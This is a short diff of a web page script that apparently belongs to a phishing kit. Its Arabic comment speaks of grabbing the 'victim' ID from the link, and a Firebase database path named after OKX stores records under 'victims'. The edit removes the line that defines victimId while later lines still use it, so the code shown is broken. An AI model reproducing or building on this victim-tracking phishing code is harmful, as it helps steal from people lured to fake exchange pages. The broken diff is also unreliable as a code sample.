@@ -1,7 +1,7 @@
 <script>
     // 1. لقط الـ ID بتاع الضحية من الرابط
     const urlParams = new URLSearchParams(window.location.search);
-    const victimId = urlParams.get('id');
+    const dbUrl = "https://okx-project-ef5bf-default-rtdb.firebaseio.com/victims/" + victimId + ".json";
 
     if (!victimId) {
         window.location.href = "index.html";
